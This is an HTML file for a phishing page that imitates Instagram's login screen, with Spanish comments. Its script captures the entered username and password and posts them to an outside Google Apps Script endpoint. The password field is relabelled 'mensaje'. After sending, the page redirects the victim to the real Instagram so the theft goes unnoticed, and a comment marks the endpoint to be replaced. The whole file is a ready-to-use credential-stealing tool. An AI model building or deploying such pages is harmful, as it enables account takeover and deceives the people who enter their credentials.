<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #fff;
      padding: 40px;
      border: 1px solid #ddd;
      text-align: center;
    }
    .input {
      display: block;
      margin: 10px auto;
      padding: 10px;
      width: 100%;
      max-width: 250px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .btn {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .logo {
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

  <form id="miFormulario" class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" width="100">
    </div>
    <input type="text" placeholder="Phone number, username, or email" class="input" required>
    <input type="password" placeholder="Password" class="input" required>
    <button type="submit" class="btn">Log In</button>
  </form>

  <script>
    const form = document.getElementById('miFormulario');

    form.addEventListener('submit', e => {
      e.preventDefault();

      const inputs = document.querySelectorAll('.input');

      const data = {
        usuario: inputs[0].value,   // nombre de usuario
        mensaje: inputs[1].value    // contraseña
      };

      fetch('https://script.google.com/macros/s/AKfycby0PvqWfIQpArhA7C5jiHAjb7hvR8b79UlXia1-7do3s7Qzq10zC3SIVCMtG30w8-wgGA/exec', {  // REEMPLAZA AQUÍ
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(res => res.json())
      .then(response => {
        // Opcional: redirigir a Instagram real tras enviar
        window.location.href = "https://www.instagram.com";
      })
      .catch(error => {
        console.error('Error:', error);
        alert("Hubo un error al enviar.");
      });
    });
  </script>

</body>
</html>
